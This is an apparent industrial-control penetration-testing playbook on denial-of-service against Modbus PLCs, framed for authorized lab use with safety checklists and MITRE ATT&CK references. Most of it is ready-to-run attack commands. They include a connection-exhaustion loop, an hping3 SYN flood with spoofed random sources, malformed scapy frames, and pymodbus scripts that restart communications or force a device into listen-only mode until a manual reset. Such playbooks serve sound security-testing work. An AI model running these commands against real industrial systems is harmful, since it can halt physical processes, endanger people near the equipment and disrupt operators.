# Playbook 05 — Denial of Service

**Goal:** Demonstrate (in a controlled way) how vulnerable industrial devices are to network-level DoS.

**Risk:** 🔴🔴 **Very high.** Most PLCs reboot or fault under modest load.

⚠️ **Lab only. Explicit approval. One device at a time. Have a power-cycle plan.**

---

## Why DoS Matters in OT

Modbus TCP, S7, and most industrial protocols have:
- No rate-limiting
- Few concurrent-connection limits (often 1-4)
- Watchdog timers that can trip and halt the process if the controller is unresponsive

A trivial flood is a real-world OT attack pattern — easy to mount, hard to defend against without dedicated hardware.

---

## Pre-Flight

- [ ] Authorization documented
- [ ] Baseline state snapshot taken
- [ ] Independent way to verify the PLC has stopped (HMI screen, blink test, etc.)
- [ ] Power-cycle plan ready
- [ ] Single target — not a subnet sweep

---

## Test 1 — Connection Exhaustion

```bash
TARGET=192.168.1.95
ENG=/engagements/<name>

# Start a parallel monitor
kali -c "while true; do nc -zv -w 2 $TARGET 502 2>&1 | head -1; sleep 2; done" &
MON=$!

# Open many connections, hold them open
kali -c "for i in \$(seq 1 50); do nc $TARGET 502 < /dev/null & done; wait"

# Stop monitor
kill $MON
```

Observe: at what concurrent count does the device stop responding?

## Test 2 — SYN Flood (host TCP stack)

```bash
kali hping3 -S -p 502 --flood --rand-source $TARGET
# Ctrl-C to stop. Do not run more than 10-30 seconds.
```

⚠️ `--rand-source` makes the flood untraceable from logs. Only acceptable in your own lab. Never on production, even authorized.

## Test 3 — Malformed Modbus Frame

Use `scapy` to send garbage to :502:

```bash
kali -c "python3 -c \"
from scapy.all import IP, TCP, Raw, send
for _ in range(100):
    send(IP(dst='$TARGET')/TCP(dport=502, flags='S')/Raw(load=b'\\xff'*256), verbose=0)\""
```

Some PLC Modbus stacks crash on unexpected payloads.

## Test 4 — Modbus FC 8 Sub-code 1 (Restart Communications)

This is a **legitimate Modbus diagnostic** — but unauthenticated. Anyone can send it.

```bash
kali -c "python3 << 'EOF'
from pymodbus.client import ModbusTcpClient
from pymodbus.diag_message import RestartCommunicationsOptionRequest
c = ModbusTcpClient('$TARGET', port=502)
c.connect()
print(c.execute(False, RestartCommunicationsOptionRequest(toggle=False)))
c.close()
EOF"
```

## Test 5 — Modbus FC 8 Sub-code 4 (Force Listen Only Mode)

```bash
kali -c "python3 << 'EOF'
from pymodbus.client import ModbusTcpClient
from pymodbus.diag_message import ForceListenOnlyModeRequest
c = ModbusTcpClient('$TARGET', port=502)
c.connect()
print(c.execute(False, ForceListenOnlyModeRequest()))
c.close()
EOF"
```

After this, the device ignores all writes until a manual reset.

---

## After the Test

1. Verify the device recovered (or power-cycle it).
2. Verify process state matches baseline (or restore from snapshot).
3. Log the exact command, duration, and observed effect to `writes.log`.
4. Record finding with MITRE technique ID.

---

## MITRE ATT&CK for ICS

- [T0814 Denial of Service](https://attack.mitre.org/techniques/T0814/)
- [T0816 Device Restart/Shutdown](https://attack.mitre.org/techniques/T0816/)
- [T0828 Loss of Productivity and Revenue](https://attack.mitre.org/techniques/T0828/)

## Next

→ [Playbook 06 — Reporting](06-reporting.md)
